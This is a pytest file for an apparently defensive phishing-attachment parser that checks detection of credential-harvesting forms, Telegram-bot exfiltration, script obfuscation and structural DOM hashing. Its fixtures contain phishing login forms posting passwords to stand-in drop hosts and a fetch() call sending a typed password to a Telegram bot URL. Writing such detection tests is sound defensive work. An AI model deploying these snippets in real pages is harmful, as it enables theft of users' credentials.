import sys
import os
import pytest

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.join(ROOT_DIR, "services", "sandbox", "src"))

from attachment_parser import AttachmentParser

def test_html_credential_harvesting_detection():
    html_sample = """
    <html><body>
      <form action="https://exfil-gate.xyz/drop.php" method="POST">
        <input type="text" name="email" placeholder="Email" />
        <input type="password" name="password" placeholder="Password" />
        <button type="submit">Войти</button>
      </form>
    </body></html>
    """
    res = AttachmentParser.parse_html(html_sample)
    assert res["forms_count"] == 1
    assert res["has_password_field"] is True
    assert res["forms"][0]["has_password"] is True
    assert res["forms"][0]["is_external"] is True

def test_html_telegram_exfiltration_detection():
    html_sample = """
    <script>
      function sendData(pwd) {
        fetch("https://api.telegram.org/bot123456789:ABCdefGHI/sendMessage?chat_id=987&text=" + pwd);
      }
    </script>
    <input type="password" id="p" />
    <button onclick="sendData(document.getElementById('p').value)">Submit</button>
    """
    res = AttachmentParser.parse_html(html_sample)
    assert res["has_telegram_exfil"] is True
    assert res["has_password_field"] is True

def test_html_obfuscation_detection():
    html_sample = """
    <script>
      var a = String.fromCharCode(101, 118, 97, 108);
      eval(function(p,a,c,k,e,d){return p;}('test', 1, 1, []));
    </script>
    """
    res = AttachmentParser.parse_html(html_sample)
    assert res["has_script_obfuscation"] is True

def test_eml_parsing_real_sample():
    eml_path = os.path.join(ROOT_DIR, "file_for_case/keis2/Сбер/0517e90f5805fff01c086cbc6ace8010e0a643e6/0517e90f5805fff01c086cbc6ace8010e0a643e6")
    if os.path.exists(eml_path):
        with open(eml_path, "rb") as f:
            res = AttachmentParser.parse_eml(f.read())
        assert res["type"] == "eml"
        assert res["from_address"] == "kevin@nova.gy"
        assert res["from_domain"] == "nova.gy"
        assert "Сбербанк" in res["from_name"]

def test_dom_skeleton_and_structural_hash():
    # Two HTML snippets with different texts, comments and classes, but identical tag skeletons
    html_page1 = """
    <!DOCTYPE html>
    <html>
      <head><title>Page 1</title></head>
      <body>
        <!-- Random comment 1 -->
        <div class="box1">
          <form action="/login.php" method="POST">
            <input type="text" name="user" value="alice" />
            <input type="password" name="pass" />
            <button type="submit">Sign In</button>
          </form>
        </div>
      </body>
    </html>
    """

    html_page2 = """
    <!DOCTYPE html>
    <html>
      <head><title>Different Title</title></head>
      <body>
        <!-- Another noise comment 22222 -->
        <div id="different_id" style="color:red">
          <form action="https://drop.xyz/post.php" method="POST">
            <input type="text" name="email_address" placeholder="Enter email" />
            <input type="password" name="user_password" />
            <button type="submit">Войти в аккаунт</button>
          </form>
        </div>
      </body>
    </html>
    """

    # A page with a completely different structure
    html_page3 = """
    <html>
      <body>
        <table>
          <tr><td>Simple Table</td></tr>
        </table>
      </body>
    </html>
    """

    res1 = AttachmentParser.parse_html(html_page1)
    res2 = AttachmentParser.parse_html(html_page2)
    res3 = AttachmentParser.parse_html(html_page3)

    assert "dom_structural_hash" in res1
    assert "dom_skeleton" in res1
    assert res1["dom_structural_hash"].startswith("dom_skel_")
    
    # Identical tag structures must produce the EXACT same structural hash!
    assert res1["dom_structural_hash"] == res2["dom_structural_hash"]
    
    # Different tag structure must produce a different hash
    assert res1["dom_structural_hash"] != res3["dom_structural_hash"]
